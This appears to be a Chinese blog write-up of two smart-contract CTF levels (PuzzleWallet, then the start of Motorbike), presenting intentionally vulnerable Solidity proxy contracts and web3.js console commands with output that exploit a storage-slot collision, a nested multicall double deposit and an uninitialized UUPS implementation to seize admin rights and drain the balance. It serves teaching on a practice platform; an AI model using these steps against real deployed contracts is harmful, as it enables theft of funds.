class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/proxy/UpgradeableProxy.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract PuzzleProxy is UpgradeableProxy &#123;</span><br><span class="line">    address public pendingAdmin;</span><br><span class="line">    address public admin;</span><br><span class="line"></span><br><span class="line">    constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) public &#123;</span><br><span class="line">        admin = _admin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyAdmin &#123;</span><br><span class="line">      require(msg.sender == admin, &quot;Caller is not the admin&quot;);</span><br><span class="line">      _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">        pendingAdmin = _newAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123;</span><br><span class="line">        require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;);</span><br><span class="line">        admin = pendingAdmin;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function upgradeTo(address _newImplementation) external onlyAdmin &#123;</span><br><span class="line">        _upgradeTo(_newImplementation);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract PuzzleWallet &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public owner;</span><br><span class="line">    uint256 public maxBalance;</span><br><span class="line">    mapping(address =&gt; bool) public whitelisted;</span><br><span class="line">    mapping(address =&gt; uint256) public balances;</span><br><span class="line"></span><br><span class="line">    function init(uint256 _maxBalance) public &#123;</span><br><span class="line">        require(maxBalance == 0, &quot;Already initialized&quot;);</span><br><span class="line">        maxBalance = _maxBalance;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function addToWhitelist(address addr) external &#123;</span><br><span class="line">        require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">        whitelisted[addr] = true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] = balances[msg.sender].add(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">        balances[msg.sender] = balances[msg.sender].sub(value);</span><br><span class="line">        (bool success, ) = to.call&#123; value: value &#125;(data);</span><br><span class="line">        require(success, &quot;Execution failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">        bool depositCalled = false;</span><br><span class="line">        for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">            bytes memory _data = data[i];</span><br><span class="line">            bytes4 selector;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                selector := mload(add(_data, 32))</span><br><span class="line">            &#125;</span><br><span class="line">            if (selector == this.deposit.selector) &#123;</span><br><span class="line">                require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">                // Protect against reusing msg.value</span><br><span class="line">                depositCalled = true;</span><br><span class="line">            &#125;</span><br><span class="line">            (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">            require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>题目要求成为代理合约的admin</p>
<p>首先先了解一下代理合约<br>更多：<a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/contracts/4.x/api/proxy">https://docs.openzeppelin.com/contracts/4.x/api/proxy</a><br><a target="_blank" rel="noopener" href="https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies">https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies</a></p>
<p>由于在以太坊上的每一笔交易都是不可变的，这使得网络更安全、让每个人都能验证交易。然而由于这个限制，开发者无法更新合约代码，因为已经部署在区块链上的合约不能修改</p>
<p>为克服该问题，可升级合约（upgrableable contract）被引入。该部署模式由两个合约组成：代理合约（存储层）和实现合约（逻辑层）。在该架构下，用户合约通过代理合约与逻辑合约交互。当需要更新逻辑合约的代码时，代理合约更新逻辑合约的地址，从而允许用户与新的逻辑合约进行交互</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xYT0sg"><img src="https://s1.ax1x.com/2022/10/10/xYT0sg.png" alt="xYT0sg.png"></a></p>
<p>需要注意的是，实现可升级模式时，两个合约中slot的安排应该是相同的，因为slot是映射的（通常代理合约使用delegatecall调用逻辑合约的函数），这意味着当代理合约调用实现合约时，将修改代理合约的存储变量并在代理的上下文进行调用。</p>
<p>回到题目注意到代理合约和逻辑合约的slot存储如下</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>slot</th>
<th>proxy contract</th>
<th>logic contract</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>pendingAdmin</td>
<td>owner</td>
</tr>
<tr>
<td>1</td>
<td>admin</td>
<td>maxBalance</td>
</tr>
<tr>
<td>2</td>
<td>whitelisted(map)</td>
</tr>
<tr>
<td>3</td>
<td>balances(map)</td>
</tr>
</tbody>
</table>
</div>
<p>想要将代理合约的admin，即可以将逻辑合约中的maxBalance改成player的地址。而对maxBalance操作的函数如下，注意到存在两个限制条件：1、合约的余额为0；2、函数修饰符<code>onlyWhitelisted</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance == 0, &quot;Contract balance is not 0&quot;);</span><br><span class="line">      maxBalance = _maxBalance;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>先看修饰符<code>onlyWhitelisted</code>，要先将player加到白名单里。<code>addToWhitelist</code>可以加入白名单，但是又要求只能<code>owner</code>才能使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">modifier onlyWhitelisted &#123;</span><br><span class="line">        require(whitelisted[msg.sender], &quot;Not whitelisted&quot;);</span><br><span class="line">        _;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">function addToWhitelist(address addr) external &#123;</span><br><span class="line">    require(msg.sender == owner, &quot;Not the owner&quot;);</span><br><span class="line">    whitelisted[addr] = true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>而<code>pendingAdmin</code>和<code>owner</code>均存储于slot0，所以考虑修改<code>pendingAdmin</code>，如下调用即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function proposeNewAdmin(address _newAdmin) external &#123;</span><br><span class="line">    pendingAdmin = _newAdmin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看如何将合约余额耗尽，初始余额为0.001</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(instance)</span><br><span class="line"><span class="string">&#x27;0.001&#x27;</span></span><br></pre></td></tr></table></figure>
<p>合约提供了函数<code>execute</code>，将合约的钱转给用户，要求<code>balances[msg.sender] &gt;= value</code>才能取钱</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">    require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(value);</span><br><span class="line">    (bool success, ) = to.call.value(value)(data);</span><br><span class="line">    require(success, &quot;Execution failed&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再看能够操作<code>balances[msg.sender]</code>的函数，<code>deposit</code>能够存钱，但是合约通过映射<code>balances</code>记录了每个用户存了多少钱，存的钱会加到合约的总余额中，而<code>execute</code>取钱时会判断取出的金额不能超过用户存入的金额，所以这里就需要思考如何让合约记录的金额大于我们实际拥有的金额，从而取完合约中的钱</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function deposit() external payable onlyWhitelisted &#123;</span><br><span class="line">      require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;);</span><br><span class="line">      balances[msg.sender] = balances[msg.sender].add(msg.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意到函数<code>muticall</code>允许多次调用合约函数，但是会通过函数选择器判断调用的是否是<code>deposit</code>函数，如果是的话会加入一个flag位<code>depositCalled</code>来阻止多次调用<code>deposit</code>。这里是利用的关键</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123;</span><br><span class="line">    bool depositCalled = false;</span><br><span class="line">    for (uint256 i = 0; i &lt; data.length; i++) &#123;</span><br><span class="line">        bytes memory _data = data[i];</span><br><span class="line">        bytes4 selector;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            selector := mload(add(_data, 32))</span><br><span class="line">        &#125;</span><br><span class="line">        if (selector == this.deposit.selector) &#123;</span><br><span class="line">            require(!depositCalled, &quot;Deposit can only be called once&quot;);</span><br><span class="line">            // Protect against reusing msg.value</span><br><span class="line">            depositCalled = true;</span><br><span class="line">        &#125;</span><br><span class="line">        (bool success, ) = address(this).delegatecall(data[i]);</span><br><span class="line">        require(success, &quot;Error while delegating call&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>muticall</code>只能调用一次<code>deposit</code>，然而可以使用<code>muticall</code>连续调用两次<code>muticall</code>，内部的<code>muticall</code>再调用一次<code>deposit</code>，这样就能实现一次交易实际上调用了两次<code>deposit</code>，我们提供了<code>0.001 ether</code>，合约余额变为<code>0.002 ether</code>，但是合约记录我们存入的钱将是<code>0.002 ether</code></p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">       multicall</span><br><span class="line">          |<span class="string"></span></span><br><span class="line"><span class="string">   -----------------</span></span><br><span class="line"><span class="string">   </span>|<span class="string">               </span>|</span><br><span class="line">multicall        multicall</span><br><span class="line">   |<span class="string">                 </span>|</span><br><span class="line"> deposit          deposit     </span><br></pre></td></tr></table></figure>
<p>接下来开始操作，首先通过<code>proposeNewAdmin</code>成为<code>owner</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">functionSelector = web3.<span class="property">utils</span>.<span class="title function_">sha3</span>(<span class="string">&#x27;proposeNewAdmin(address)&#x27;</span>).<span class="title function_">slice</span>(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line"><span class="string">&#x27;0xa6376746&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">sendTransaction</span>(&#123;<span class="attr">from</span>:player, <span class="attr">to</span>:contract.<span class="property">address</span>, <span class="attr">data</span>:web3.<span class="property">utils</span>.<span class="title function_">encodePacked</span>(functionSelector, web3.<span class="property">utils</span>.<span class="title function_">padLeft</span>(player, <span class="number">64</span>))&#125;)</span><br></pre></td></tr></table></figure>
<p>检查<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">player === <span class="keyword">await</span> contract.<span class="title function_">owner</span>()</span><br><span class="line"><span class="literal">true</span></span><br></pre></td></tr></table></figure></p>
<p>然后把自己加入白名单<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">addToWhitelist</span>(player)</span><br></pre></td></tr></table></figure></p>
<p>构造数据进行函数调用并提供0.001 ether<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">depositData = <span class="keyword">await</span> contract.<span class="property">methods</span>[<span class="string">&quot;deposit()&quot;</span>].<span class="title function_">request</span>().<span class="title function_">then</span>(<span class="function"><span class="params">v</span>=&gt;</span>v.<span class="property">data</span>)</span><br><span class="line">muticallData = <span class="keyword">await</span> contract.<span class="property">methods</span>[<span class="string">&quot;multicall(bytes[])&quot;</span>].<span class="title function_">request</span>([depositData]).<span class="title function_">then</span>(<span class="function"><span class="params">v</span> =&gt;</span> v.<span class="property">data</span>)</span><br><span class="line"><span class="keyword">await</span> contract.<span class="title function_">multicall</span>([muticallData, muticallData], &#123;<span class="attr">value</span>:<span class="title function_">toWei</span>(<span class="string">&#x27;0.001&#x27;</span>)&#125;)</span><br></pre></td></tr></table></figure></p>
<p>查看存储进行验证，映射存储的规则是键值和按顺序保留的第几个slot一起算keccak256，注意算的时候20字节的地址要补齐成32字节。存储的单位是wei，看到记录存进去了<code>0.02 ether = 2000000000000000 wei = 0x71AFD498D0000 wei</code></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">position = <span class="keyword">await</span> web3.<span class="property">utils</span>.<span class="title function_">soliditySha3</span>(web3.<span class="property">utils</span>.<span class="title function_">padLeft</span>(player, <span class="number">64</span>), <span class="number">3</span>)</span><br><span class="line">position</span><br><span class="line"><span class="string">&#x27;0xdef281e1f421293060b2db34c34ae4b665066cdf00fdb90a121f8d9e4fdc231f&#x27;</span></span><br><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, position)</span><br><span class="line"><span class="string">&#x27;0x00000000000000000000000000000000000000000000000000071afd498d0000&#x27;</span></span><br></pre></td></tr></table></figure>
<p>存储位置的哈希值用solidity算也行<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract test &#123;</span><br><span class="line">  bytes32 public ans2  = keccak256(abi.encodePacked(uint(0x862570693111DB350a6376c095B7E57c7650E78d),uint(3)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xNr1VU"><img src="https://s1.ax1x.com/2022/10/11/xNr1VU.png" alt="xNr1VU.png"></a></p>
<p>而此时由于实际上我们只给合约提供了0.001 ether，所以合约余额0.002<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(instance)</span><br><span class="line"><span class="string">&#x27;0.002&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>于是便可以通过<code>execute</code>取出合约所有钱了<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> contract.<span class="title function_">execute</span>(player, <span class="title function_">toWei</span>(<span class="string">&#x27;0.002&#x27;</span>), <span class="number">0</span>)</span><br><span class="line"><span class="keyword">await</span> <span class="title function_">getBalance</span>(instance)</span><br><span class="line"><span class="string">&#x27;0&#x27;</span></span><br></pre></td></tr></table></figure></p>
<p>最后再用<code>setMaxBalance</code>即可成为admin<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">await contract.setMaxBalance(player)</span><br><span class="line">await web3.eth.getStorageAt(contract.address, 1)</span><br><span class="line">&#x27;0x000000000000000000000000862570693111db350a6376c095b7e57c7650e78d&#x27;</span><br></pre></td></tr></table></figure></p>
<h1 id="Motorbike"><a href="#Motorbike" class="headerlink" title="Motorbike"></a>Motorbike</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity &lt;0.7.0;</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/utils/Address.sol&quot;;</span><br><span class="line">import &quot;@openzeppelin/contracts/proxy/Initializable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Motorbike &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line">    </span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.</span><br><span class="line">    constructor(address _logic) public &#123;</span><br><span class="line">        require(Address.isContract(_logic), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;</span><br><span class="line">        (bool success,) = _logic.delegatecall(</span><br><span class="line">            abi.encodeWithSignature(&quot;initialize()&quot;)</span><br><span class="line">        );</span><br><span class="line">        require(success, &quot;Call failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Delegates the current call to `implementation`.</span><br><span class="line">    function _delegate(address implementation) internal virtual &#123;</span><br><span class="line">        // solhint-disable-next-line no-inline-assembly</span><br><span class="line">        assembly &#123;</span><br><span class="line">            calldatacopy(0, 0, calldatasize())</span><br><span class="line">            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)</span><br><span class="line">            returndatacopy(0, 0, returndatasize())</span><br><span class="line">            switch result</span><br><span class="line">            case 0 &#123; revert(0, returndatasize()) &#125;</span><br><span class="line">            default &#123; return(0, returndatasize()) &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Fallback function that delegates calls to the address returned by `_implementation()`. </span><br><span class="line">    // Will run if no other function in the contract matches the call data</span><br><span class="line">    fallback () external payable virtual &#123;</span><br><span class="line">        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Returns an `AddressSlot` with member `value` located at `slot`.</span><br><span class="line">    function _getAddressSlot(bytes32 slot) internal pure returns (AddressSlot storage r) &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := slot</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Engine is Initializable &#123;</span><br><span class="line">    // keccak-256 hash of &quot;eip1967.proxy.implementation&quot; subtracted by 1</span><br><span class="line">    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class="line"></span><br><span class="line">    address public upgrader;</span><br><span class="line">    uint256 public horsePower;</span><br><span class="line"></span><br><span class="line">    struct AddressSlot &#123;</span><br><span class="line">        address value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function initialize() external initializer &#123;</span><br><span class="line">        horsePower = 1000;</span><br><span class="line">        upgrader = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Upgrade the implementation of the proxy to `newImplementation`</span><br><span class="line">    // subsequently execute the function call</span><br><span class="line">    function upgradeToAndCall(address newImplementation, bytes memory data) external payable &#123;</span><br><span class="line">        _authorizeUpgrade();</span><br><span class="line">        _upgradeToAndCall(newImplementation, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Restrict to upgrader role</span><br><span class="line">    function _authorizeUpgrade() internal view &#123;</span><br><span class="line">        require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.</span><br><span class="line">    function _upgradeToAndCall(</span><br><span class="line">        address newImplementation,</span><br><span class="line">        bytes memory data</span><br><span class="line">    ) internal &#123;</span><br><span class="line">        // Initial upgrade and setup call</span><br><span class="line">        _setImplementation(newImplementation);</span><br><span class="line">        if (data.length &gt; 0) &#123;</span><br><span class="line">            (bool success,) = newImplementation.delegatecall(data);</span><br><span class="line">            require(success, &quot;Call failed&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    // Stores a new address in the EIP1967 implementation slot.</span><br><span class="line">    function _setImplementation(address newImplementation) private &#123;</span><br><span class="line">        require(Address.isContract(newImplementation), &quot;ERC1967: new implementation is not a contract&quot;);</span><br><span class="line">        </span><br><span class="line">        AddressSlot storage r;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            r_slot := _IMPLEMENTATION_SLOT</span><br><span class="line">        &#125;</span><br><span class="line">        r.value = newImplementation;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>又没编译成功</p>
<p>题目要求使用<code>selfdestruct</code>engine并让motorbike合约无法使用</p>
<p>本题使用UUPS（Universable Upgradeable Proxy standard）。上一个level看到的代理模式是Transparent代理模式。不同之处在于UUPS代理模式中，合约的升级逻辑在编码和实现合约中，而不是代理合约中，这可以让用户节省一些gas。结构如下</p>
<p><a target="_blank" rel="noopener" href="https://imgse.com/i/xyJFW4"><img src="https://s1.ax1x.com/2022/10/20/xyJFW4.png" alt="xyJFW4.png"></a></p>
<p>另一个区别在和代理合约中定义了一个存储slot，用于存储逻辑合约的地址。每次逻辑合约升级时都会更新该值，防止存储冲突。更多参考<a target="_blank" rel="noopener" href="https://eips.ethereum.org/EIPS/eip-1967">https://eips.ethereum.org/EIPS/eip-1967</a></p>
<p>如下题目合约中定义了存储slot，该slot存放了实现/逻辑合约的地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="string">&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;0x000000000000000000000000dcc1325db619167919bdcad9c4c2ead79c515d63&#x27;</span></span><br><span class="line">impl_addr = <span class="keyword">await</span> web3.<span class="property">eth</span>.<span class="title function_">getStorageAt</span>(instance, <span class="string">&#x27;0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;0x000000000000000000000000dcc1325db619167919bdcad9c4c2ead79c515d63&#x27;</span></span><br><span class="line">impl_addr = <span class="string">&#x27;0x&#x27;</span>+impl_addr.<span class="title function_">slice</span>(-<span class="number">40</span>)</span><br><span class="line"><span class="string">&#x27;0xdcc1325db619167919bdcad9c4c2ead79c515d63&#x27;</span></span><br></pre></td></tr></table></figure>
<p>注意题目中更新实现合约要求是<code>upgrader</code>，而初始化函数会将<code>upgrader</code>设置为<code>msg.sender</code>。所以只需要我们去调用实现合约的初始化函数，就能变成<code>upgrader</code></p>
